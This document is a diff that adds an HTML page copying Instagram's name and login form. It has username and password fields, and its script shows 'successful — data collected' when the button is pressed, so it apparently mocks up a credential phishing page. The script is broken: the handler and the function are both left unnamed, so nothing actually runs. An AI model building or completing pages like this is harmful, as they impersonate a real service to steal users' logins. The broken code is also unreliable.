@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram </title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      text-align: center;
+      padding-top: 70px;
+    }
+
+    .box {
+      width: 300px;
+      margin: auto;
+      padding: 30px;
+      background: white;
+      border: 1px solid #ddd;
+    }
+
+    input, button {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 12px;
+      margin: 6px 0;
+    }
+
+    button {
+      background: #3897f0;
+      color: white;
+      border: 0;
+      border-radius: 5px;
+    }
+
+    #msg {
+      margin-top: 15px;
+      color: green;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="box">
+    <h1>Instagram</h1>
+    
+    <input type="text" placeholder=" username">
+    <input type="password" placeholder=" password">
+
+    <button onclick="()">Log In</button>
+
+    <p id="msg"></p>
+  </div>
+
+  <script>
+    function () {
+      document.getElementById("msg").innerText =
+        "successful —  data collected.";
+    }
+  </script>
+</body>
+</html>
